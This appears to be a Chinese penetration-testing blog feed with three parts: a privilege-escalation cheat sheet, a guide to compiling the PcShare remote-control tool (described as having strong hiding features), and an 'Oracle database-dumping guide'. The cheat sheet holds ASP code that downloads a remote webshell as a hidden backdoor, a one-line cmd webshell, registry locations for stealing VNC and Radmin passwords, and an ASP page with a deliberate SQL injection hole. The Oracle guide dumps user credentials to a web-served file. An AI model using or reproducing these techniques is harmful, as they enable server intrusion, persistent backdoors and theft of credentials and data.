<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_CURRENT_USER<span class="command">\Software</span><span class="command">\Microsoft</span><span class="command">\Microsoft</span> SQL Server\80<span class="command">\Tools</span><span class="command">\Client</span><span class="command">\PrefServers</span></div></pre></td></tr></table></figure>

<p>找到接接过的信息删除。<br>MSSQL 2005 是在：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:<span class="command">\Documents</span> and Settings<span class="command">\\</span>Application Data<span class="command">\Microsoft</span><span class="command">\Microsoft</span> SQL Server\90<span class="command">\Tools</span><span class="command">\Shell</span><span class="command">\mru</span>.dat</div></pre></td></tr></table></figure>

<p>防BT系统拦截技巧，可以使用远程下载shell：</p>
<figure class="highlight asp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="vbscript">&lt;% </span></div><div class="line"><span class="keyword">Sub</span> eWebEditor_SaveRemoteFile(s_LocalFileName, s_RemoteFileUrl) </div><div class="line"><span class="keyword">Dim</span> Ads, Retrieval, GetRemoteData </div><div class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </div><div class="line"><span class="keyword">Set</span> Retrieval = <span class="built_in">Server</span>.<span class="built_in">CreateObject</span>(<span class="string">"Microsoft.XMLHTTP"</span>) </div><div class="line"><span class="keyword">With</span> Retrieval </div><div class="line">.Open <span class="string">"Get"</span>, s_RemoteFileUrl, <span class="literal">False</span>, <span class="string">""</span>, <span class="string">""</span> </div><div class="line">.Send </div><div class="line">GetRemoteData = .ResponseBody </div><div class="line"><span class="keyword">End</span> <span class="keyword">With</span> </div><div class="line"><span class="keyword">Set</span> Retrieval = <span class="literal">Nothing</span> </div><div class="line"><span class="keyword">Set</span> Ads = <span class="built_in">Server</span>.<span class="built_in">CreateObject</span>(<span class="string">"Adodb.Stream"</span>) </div><div class="line"><span class="keyword">With</span> Ads </div><div class="line">.Type = <span class="number">1</span> </div><div class="line">.Open </div><div class="line">.Write GetRemoteData </div><div class="line">.SaveToFile <span class="built_in">Server</span>.MapPath(s_LocalFileName), <span class="number">2</span> </div><div class="line">.Cancel() </div><div class="line">.Close() </div><div class="line"><span class="keyword">End</span> <span class="keyword">With</span> </div><div class="line"><span class="keyword">Set</span> Ads = <span class="literal">Nothing</span> </div><div class="line"><span class="keyword">End</span> <span class="keyword">Sub</span> </div><div class="line">eWebEditor_SaveRemoteFile <span class="string">"your shell's name"</span>, <span class="string">"your shell'urL"</span> </div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<p>防BT系统拦截技巧，可以使用远程下载shell，也达到了隐藏自身的效果，也可以做为超隐蔽的后门，神马的免杀webshell，用服务器安全工具一扫通通挂掉了。  </p>
<h2 id="VNC、Radmin、PcAnywhere_的提权方法">VNC、Radmin、PcAnywhere 的提权方法</h2>
<p>首先利用 shell 读取 vnc 保存在注册表中的密文，然后再使用工具VNC4X破解。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">注册表位置：HKEY_LOCAL_MACHINE<span class="command">\SOFTWARE</span><span class="command">\RealVNC</span><span class="command">\WinVNC</span>4<span class="command">\password</span></div></pre></td></tr></table></figure>

<p>Radmin 默认端口是4899，先获取密码和端口，如下位置：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="command">\SYSTEM</span><span class="command">\RAdmin</span><span class="command">\v</span>2.0<span class="command">\Server</span><span class="command">\Parameters</span><span class="command">\Parameter</span> //默认密码注册表位置 </div><div class="line">HKEY_LOCAL_MACHINE<span class="command">\SYSTEM</span><span class="command">\RAdmin</span><span class="command">\v</span>2.0<span class="command">\Server</span><span class="command">\Parameters</span><span class="command">\Port</span> //默认端口注册表位置</div></pre></td></tr></table></figure>

<p>然后用HASH版连接。<br>如果我们拿到一台主机的WEBSEHLL。通过查找发现其上安装有 PcAnywhere 同时保存密码文件的目录是允许我们的IUSER权限访问，我们可以下载这个CIF文件到本地破解，再通过 PcAnywhere 从本机登陆服务器。<br>保存密码的CIF文件,不是位于PcAnywhere的安装目录,而且位于安装PcAnywhere所安装盘的：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">“<span class="command">\Documents</span> and Settings<span class="command">\All</span> Users<span class="command">\Application</span> Data<span class="command">\Symantec</span><span class="command">\pcAnywhere</span><span class="command">\”</span></div><div class="line">如果PcAnywhere安装在“D:<span class="command">\program</span><span class="command">\”</span>文件夹下，那么PcAnywhere的密码文件就保存在：“D:<span class="command">\Documents</span> and Settings<span class="command">\All</span> Users<span class="command">\Application</span> Data<span class="command">\Symantec</span><span class="command">\pcAnywhere</span><span class="command">\”</span>文件夹下。</div></pre></td></tr></table></figure>

<p>WinWebMail 提权加用户：<br>WinWebMail目录下的web必须设置everyone权限可读可写，在开始程序里，找到WinWebMail快捷方式，接下来，看路径，访问“路径\web”传 shell，访问shell后，权限是system，直接放远控进启动项，等待下次重启。<br>没有删cmd组件的可以直接加用户，7i24的web目录也是可写，权限为administrator。<br>1433 SA权限构建注入点：</p>
<figure class="highlight asp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="vbscript">&lt;% </span></div><div class="line">strSQLServerName = <span class="string">"服务器ip"</span> </div><div class="line">strSQLDBUserName = <span class="string">"数据库帐号"</span> </div><div class="line">strSQLDBPassword = <span class="string">"数据库密码"</span> </div><div class="line">strSQLDBName = <span class="string">"数据库名称"</span> </div><div class="line"><span class="keyword">Set</span> conn = <span class="built_in">server</span>.<span class="built_in">CreateObject</span>(<span class="string">"ADODB.Connection"</span>) </div><div class="line">strCon = <span class="string">"Provider=SQLOLEDB.1;Persist Security Info=False;Server="</span> & strSQLServerName & <span class="string">";User ID="</span> & strSQLDBUserName & <span class="string">";Password="</span> & strSQLDBPassword & <span class="string">";Database="</span> & strSQLDBName & <span class="string">";"</span> </div><div class="line">conn.open strCon </div><div class="line"><span class="keyword">Dim</span> rs, strSQL, id </div><div class="line"><span class="keyword">Set</span> rs = <span class="built_in">server</span>.<span class="built_in">CreateObject</span>(<span class="string">"ADODB.recordset"</span>) </div><div class="line">id = <span class="built_in">request</span>(<span class="string">"id"</span>) </div><div class="line">strSQL = <span class="string">"select * from ACTLIST where worldid="</span> & idrs.open strSQL,conn,<span class="number">1</span>,<span class="number">3</span> </div><div class="line">rs.Close </div><div class="line">%&gt;</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<h2 id="旁站路径问题">旁站路径问题</h2>
<p>1、读网站配置。<br>2、用以下VBS：  </p>
<figure class="highlight vbs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </div><div class="line"><span class="keyword">If</span> (<span class="built_in">LCase</span>(<span class="built_in">Right</span>(WScript.Fullname, <span class="number">11</span>)) = <span class="string">"wscript.exe"</span>) <span class="keyword">Then</span> </div><div class="line"><span class="built_in">MsgBox</span> <span class="built_in">Space</span>(<span class="number">12</span>) & <span class="string">"IIS Virtual Web Viewer"</span> & <span class="built_in">Space</span>(<span class="number">12</span>) & <span class="built_in">Chr</span>(<span class="number">13</span>) & <span class="built_in">Space</span>(<span class="number">9</span>) & <span class="string">" Usage:Cscript vWeb.vbs"</span>, <span class="number">4096</span>, <span class="string">"Lilo"</span> </div><div class="line">WScript.Quit </div><div class="line"><span class="keyword">End</span> <span class="keyword">If</span> </div><div class="line"><span class="keyword">Set</span> objservice = <span class="built_in">GetObject</span>(<span class="string">"IIS://LocalHost/W3SVC"</span>) </div><div class="line"><span class="keyword">For</span> <span class="keyword">Each</span> obj3w <span class="keyword">In</span> objservice </div><div class="line"><span class="keyword">If</span> IsNumeric(obj3w.Name) <span class="keyword">Then</span> </div><div class="line"><span class="keyword">Set</span> OService = <span class="built_in">GetObject</span>(<span class="string">"IIS://LocalHost/W3SVC/"</span> & obj3w.Name) </div><div class="line"><span class="keyword">Set</span> VDirObj = OService.<span class="built_in">GetObject</span>(<span class="string">"IIsWebVirtualDir"</span>, <span class="string">"ROOT"</span>) </div><div class="line"><span class="keyword">If</span> <span class="built_in">Err</span> &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> WScript.Quit (<span class="number">1</span>) </div><div class="line">WScript.Echo <span class="built_in">Chr</span>(<span class="number">10</span>) & <span class="string">"["</span> & OService.ServerComment & <span class="string">"]"</span> </div><div class="line"><span class="keyword">For</span> <span class="keyword">Each</span> Binds <span class="keyword">In</span> OService.ServerBindings </div><div class="line">Web = <span class="string">"{ "</span> & <span class="built_in">Replace</span>(Binds, <span class="string">":"</span>, <span class="string">" } { "</span>) & <span class="string">" }"</span> </div><div class="line">WScript.Echo <span class="built_in">Replace</span>(<span class="built_in">Split</span>(<span class="built_in">Replace</span>(Web, <span class="string">" "</span>, <span class="string">""</span>), <span class="string">"}{"</span>)(<span class="number">2</span>), <span class="string">"}"</span>, <span class="string">""</span>) </div><div class="line"><span class="keyword">Next</span> </div><div class="line">WScript.Echo <span class="string">"Path            : "</span> & VDirObj.Path </div><div class="line"><span class="keyword">End</span> <span class="keyword">If</span> </div><div class="line"><span class="keyword">Next</span></div></pre></td></tr></table></figure>

<p>3、iis_spy 列举(注：需要支持ASPX，反IISSPY的方法：将 activeds.dll，activeds.tlb 降权)。<br>4、得到目标站目录，不能直接跨的。可以通过“echo ^&lt;%execute(request(“cmd”))%^&gt; &gt;&gt;X:\目标目录\X.asp”或者“copy 脚本文件 X:\目标目录\X.asp”像目标目录写入webshell，或者还可以试试type命令。<br>]]>
    
    </summary>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[编译PcShare远程管理软件]]></title>
    <link href="https://sqzr.cc//blog/2014/08/06/bian-yi-pcshare-yuan-cheng-kong-zhi-ruan-jian/"/>
    <id>https://sqzr.cc//blog/2014/08/06/bian-yi-pcshare-yuan-cheng-kong-zhi-ruan-jian/</id>
    <published>2014-08-05T16:03:00.000Z</published>
    <updated>2014-10-30T12:38:42.000Z</updated>
    <content type="html"><![CDATA[<p><code>PcShare</code>是一款功能强大的远程管理软件，可以在内网、外网任意位置随意管理需要的远程主机，有超强的隐藏和自我修复等功能。<br>在<a href="http://www.freebuf.com/tools/39500.html" target="_blank" rel="external">freebuf</a>,看到这套源码,写下编译的经过。<br><a id="more"></a></p>
<hr>
<h1 id="安装vc6">安装vc6</h1>
<p>下载地址:<a href="http://pan.baidu.com/s/1qWPTTXq" target="_blank" rel="external">戳我</a><br>用虚拟光驱软件挂载后,一路戳下一步就OK了,建议在XP上安装编译,在win7 win8上可能需要打SP1补丁才能正常运行。  </p>
<hr>
<h1 id="安装xt库">安装xt库</h1>
<p>下载地址:<a href="http://pan.baidu.com/s/1hqBrfve" target="_blank" rel="external">戳我</a><br>VC6完成安装之后，需要安装XT库，解压到C盘根目录下！<br>导入Toolkit目录下的xtreme.reg文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">REGEDIT4</div><div class="line"><span class="special">[</span>HKEY_CURRENT_USER<span class="command">\Software</span><span class="command">\Codejock</span> Software<span class="command">\Xtreme</span> Toolkit Pro v9.60<span class="special">]</span></div><div class="line">"Installation Directory"="C:<span class="command">\\</span>Toolkit"</div></pre></td></tr></table></figure>

<p>点击：C:\Toolkit\Deploy.exe，进行安装<br><img src="//dn-sqzr.qbox.me/setup1.jpg" alt="进行选择"><br><img src="//dn-sqzr.qbox.me/setup2.jpg" alt="进行选择"><br><img src="//dn-sqzr.qbox.me/setup3.jpg" alt="进行选择"><br><img src="//dn-sqzr.qbox.me/setup4_编译中.jpg" alt="编译中">  </p>
<hr>
<h1 id="编译XT库Lib文件">编译XT库Lib文件</h1>
<p>打开:<code>C:\Toolkit\WorkSpace\XTPToolkit_Lib</code>,目录下找到<code>XTPToolkit_Lib_vc60.dsw</code>文件,使用VC6进行重新编译。  </p>
<hr>
<h1 id="替换Include_和_Lib">替换Include 和 Lib</h1>
<p>下载地址:<a href="http://pan.baidu.com/s/1i3iONHz" target="_blank" rel="external">戳我</a><br>解压后替换掉<code>C:\Program Files (x86)\Microsoft Visual Studio\VC98</code>下的Include和Lib文件。</p>
<hr>
<h1 id="编译">编译</h1>
<p>首先编译PcShare,编译过程中首先会提示:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="command">\PcShare</span><span class="command">\PcShare</span>.rc (959): error RC2135 : file not found: e:<span class="command">\tool</span><span class="command">\QQWry</span>.dat</div></pre></td></tr></table></figure>

<p>QQWry.dat文件是IP库，文件位于<code>\PCSHARE最终版本源代码\界面资源\tool\目录</code>下,拷贝到<code>\PCSHARE最终版本源代码\企业定做\PcShare\res\</code>下,修改PcShare.rc文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="type">IPDATA</span>                  <span class="type">MOD</span>     <span class="type">DISCARDABLE</span>     <span class="string">"res\\QQWry.dat"</span></div></pre></td></tr></table></figure>

<p>继续进行编译，接着会报如下错误:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\PcShare\MyGlobalFuc.cpp(<span class="number">339</span>) : <span class="built_in">error</span> C2065: <span class="string">'pFind'</span> : undeclared identifier</div></pre></td></tr></table></figure>

<p>修改<code>MyGlobalFuc.cpp</code>文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//查看是否为文件</span></div><div class="line">TCHAR* pFind = StrRChr(m_Path, <span class="keyword">NULL</span>, _T(<span class="string">'\\'</span>)); <span class="comment">// 添加这句</span></div><div class="line">pr = StrChr(ps, _T(<span class="string">'\\'</span>)); <span class="comment">// 在这句代码上面添加</span></div><div class="line"><span class="keyword">if</span>(pFind != <span class="keyword">NULL</span>)</div><div class="line">{</div><div class="line">	pFind = StrRChr(m_Path, <span class="keyword">NULL</span>, _T(<span class="string">'\\'</span>));</div><div class="line">	<span class="keyword">if</span>(pFind != <span class="keyword">NULL</span>)</div><div class="line">	{</div><div class="line">		*pFind = <span class="number">0</span>;</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>

<p>接着提示:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LINK : fatal error LNK1104: cannot <span class="built_in">open</span> <span class="built_in">file</span> <span class="string">"mfc42ud.lib"</span></div></pre></td></tr></table></figure>

<p>错误，需要在<code>VC主界面-&gt;Project-&gt;Setting-&gt;General</code>改为<code>Use MFC in a Static Library</code>。<br>最终此项目编译通过</p>
<hr>
<h1 id="编译其他文件">编译其他文件</h1>
<p>另外同目录下的PcLKey，PcMain，PcMake，PcStart都需要编译出来。<br>PcLKey工程会报错：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">..\pclkey\myfunc.h(<span class="number">22</span>) : fatal error C1083: Cannot <span class="built_in">open</span> <span class="built_in">include</span> <span class="built_in">file</span>: <span class="string">'streams.h'</span>: No such <span class="built_in">file</span> <span class="operator">or</span> <span class="built_in">directory</span></div></pre></td></tr></table></figure>

<p>其是关于视频监控的模块，可以先进行注释  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//#include &lt;streams.h&gt;</span></div></pre></td></tr></table></figure>

<p>PcLKey工程编译通过。<br>PcMain工程同样需要屏蔽streams.h头文件，编译过程中会提示9个错误。  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2065</span>: '<span class="type">IVideoWindow</span>' : undeclared identifier</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2065</span>: '<span class="type">IID_IVideoWindow</span>' : undeclared identifier</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2955</span>: '<span class="type">CComQIPtr</span>' : use <span class="keyword">of</span> class <span class="keyword">template</span> requires <span class="keyword">template</span> argument list</div><div class="line">        C:\<span class="type">Program</span> <span class="type">Files</span> (x86)\<span class="type">Microsoft</span> <span class="type">Visual</span> <span class="type">Studio</span>\<span class="type">VC98</span>\<span class="type">ATL</span>\<span class="type">INCLUDE</span>\atlbase.h(<span class="number">715</span>) : see declaration <span class="keyword">of</span> '<span class="type">CComQIPtr</span>'</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : fatal error <span class="type">C1903</span>: unable to recover <span class="keyword">from</span> previous error(s); stopping compilation</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2065</span>: '<span class="type">IVideoWindow</span>' : undeclared identifier</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2065</span>: '<span class="type">IID_IVideoWindow</span>' : undeclared identifier</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : error <span class="type">C2955</span>: '<span class="type">CComQIPtr</span>' : use <span class="keyword">of</span> class <span class="keyword">template</span> requires <span class="keyword">template</span> argument list</div><div class="line">        C:\<span class="type">Program</span> <span class="type">Files</span> (x86)\<span class="type">Microsoft</span> <span class="type">Visual</span> <span class="type">Studio</span>\<span class="type">VC98</span>\<span class="type">ATL</span>\<span class="type">INCLUDE</span>\atlbase.h(<span class="number">715</span>) : see declaration <span class="keyword">of</span> '<span class="type">CComQIPtr</span>'</div><div class="line">..\<span class="type">PcMain</span>\<span class="type">MyVideoTrans</span>.h(<span class="number">151</span>) : fatal error <span class="type">C1903</span>: unable to recover <span class="keyword">from</span> previous error(s); stopping compilation</div><div class="line"><span class="type">PcMain</span>.cpp</div><div class="line"><span class="type">Generating</span> <span class="type">Code</span>...</div><div class="line"><span class="type">Error</span> executing cl.exe.</div><div class="line"><span class="type">Creating</span> browse info file...</div><div class="line"><span class="type">BSCMAKE</span>: error <span class="type">BK1506</span> : cannot open file '.\<span class="type">Release</span>\<span class="type">MyClientMain</span>.sbr': <span class="type">No</span> such file <span class="keyword">or</span> directory</div><div class="line"><span class="type">Error</span> executing bscmake.exe.</div><div class="line"></div><div class="line"><span class="type">PcMain</span>.dll - <span class="number">9</span> error(s), <span class="number">0</span> warning(s)</div></pre></td></tr></table></figure>

<p>解决办法是修改<code>\PcMain\MyVideoTrans.h</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="input"><span class="prompt">//  注释掉这两句</span></span></div><div class="line">//	CComQIPtr&lt; IVideoWindow, &IID_IVideoWindow &gt; pWindow;</div><div class="line"><span class="regexp">//</span>	<span class="constant">CComQIPtr</span>&lt; <span class="constant">IMediaControl</span>, &<span class="constant">IID_IMediaControl</span> &gt; pControl;</div></pre></td></tr></table></figure>

<p>修改<code>\PcMain\MyVideoTrans.cpp</code>:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> CMyVideoTrans::SetFormat(ICaptureGraphBuilder2* pBuilder, IBaseFilter* pCap, <span class="keyword">long</span> lWidth, <span class="keyword">long</span> lHeight, WORD iColorBit, __int64 iRate) 函数代码全部注释，只留函数返回值</div><div class="line"></div><div class="line">HRESULT CMyVideoTrans::InitStillGraph(<span class="keyword">int</span> x, <span class="keyword">int</span> y) 函数代码全部注释，只留函数返回值</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> GetDefaultCapDevice( IBaseFilter ** ppCap )函数代码全部注释，只留函数返回值</div></pre></td></tr></table></figure>

<p>PcMain工程编译通过<br>PcMake工程注释streams.h头文件后可以编译通过<br>PcStart工程注释streams.h头文件后可以编译通过<br>全部编译完成之后，就可以进行测试咯:<br>\bin目录下为生成好的文件  </p>
<hr>
<h1 id="参考资料">参考资料</h1>
<p><a href="http://debugwar.com/archives/325/pcshare_source_compile" target="_blank" rel="external">PcShare源代码编译过程</a><br><a href="http://www.freebuf.com/tools/39500.html" target="_blank" rel="external">远程管理软件PcShare全套源码下载</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><code>PcShare</code>是一款功能强大的远程管理软件，可以在内网、外网任意位置随意管理需要的远程主机，有超强的隐藏和自我修复等功能。<br>在<a href="http://www.freebuf.com/tools/39500.html" target="_blank" rel="external">freebuf</a>,看到这套源码,写下编译的经过。<br>]]>
    
    </summary>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Oracle拖库指南]]></title>
    <link href="https://sqzr.cc//blog/2014/07/19/oracle-xia-tuo-ku-zhi-lan/"/>
    <id>https://sqzr.cc//blog/2014/07/19/oracle-xia-tuo-ku-zhi-lan/</id>
    <published>2014-07-19T01:10:00.000Z</published>
    <updated>2014-10-30T12:41:49.000Z</updated>
    <content type="html"><![CDATA[<h2 id="常用sql语句">常用sql语句</h2>
<p>查询所有表 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> ALL_TABLES</span></div></pre></td></tr></table></figure>

<p>查询当前用户表  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables;</span></div></pre></td></tr></table></figure>

<p>查询所有表按大小排序  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> TABLE_NAME,NUM_ROWS <span class="keyword">FROM</span> ALL_TABLES   <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></span></div><div class="line"><span class="keyword">select</span> table_name,NUM_ROWS <span class="keyword">from</span> user_tables     <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></div></pre></td></tr></table></figure>

<p>查询表前十条  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span>  *   <span class="keyword">from</span>  users  <span class="keyword">where</span>  rownum &lt; <span class="number">10</span></span></div></pre></td></tr></table></figure>

<p>分页查询 2000000 到 4000000  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> e.*,ROWNUM rn <span class="keyword">FROM</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> ) e <span class="keyword">WHERE</span> ROWNUM &lt;= <span class="number">4000000</span>) <span class="keyword">WHERE</span> rn &gt; <span class="number">2000000</span></span></div></pre></td></tr></table></figure>

<h2><a id="more"></a></h2>
<h2 id="sqlplus">sqlplus</h2>
<p>rpm 安装  </p>
<blockquote>
<p>   <a href="http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm" target="_blank" rel="external">http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm</a><br>   <a href="http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-basic-11.1.0.1-1.i386.rpm" target="_blank" rel="external">http://eduunix.ccut.edu.cn/index2/database/Oracle%20Instant%20Client/oracle-instantclient-basic-11.1.0.1-1.i386.rpm</a><br>   rpm -ivh oracle-instantclient-sqlplus-11.1.0.1-1.i386.rpm<br>   rpm -ivh oracle-instantclient-basic-11.1.0.1-1.i386.rpm  </p>
</blockquote>
<p>配置libs  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi <span class="regexp">/etc/</span>ld.so.conf</div><div class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/oracle/</span><span class="number">11.1</span>.<span class="number">0.1</span><span class="regexp">/client/</span>lib<span class="regexp">/</span></div></pre></td></tr></table></figure>

<p>连接<br>交互式操作  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlplus usewr/<span class="keyword">pass</span><span class="decorator">@172.100.100.41:1521/orabi</span></div><div class="line"><span class="decorator">@/tmp/1.sql</span></div></pre></td></tr></table></figure>

<p>非交互式  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlplus -s user/<span class="keyword">pass</span><span class="decorator">@172.100.100.41  @/tmp/1.sql</span></div></pre></td></tr></table></figure>

<p>1.sql:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SET</span> feedback off  </span></div><div class="line"><span class="keyword">SET</span> newpage NONE  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">50000</span>  </div><div class="line"><span class="keyword">SET</span> linesize <span class="number">300</span>  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">0</span>  </div><div class="line"><span class="keyword">SET</span> term off  </div><div class="line"><span class="keyword">SET</span> trims <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> heading off  </div><div class="line"><span class="keyword">SET</span> trimspool <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> trimout <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> timing off  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> colsep |  </div><div class="line">spool /<span class="keyword">var</span>/www/css/<span class="number">1.</span>txt</div><div class="line"><span class="keyword">SELECT</span>  user_name||<span class="string">','</span>||<span class="keyword">password</span>||<span class="string">','</span>||<span class="keyword">DATA</span>||<span class="string">','</span>||id  <span class="keyword">FROM</span>  <span class="keyword">USER</span>  <span class="keyword">WHERE</span>  rownum &lt; <span class="number">100</span> ;</div><div class="line">spool off</div></pre></td></tr></table></figure>

<p>导出CSV格式  </p>
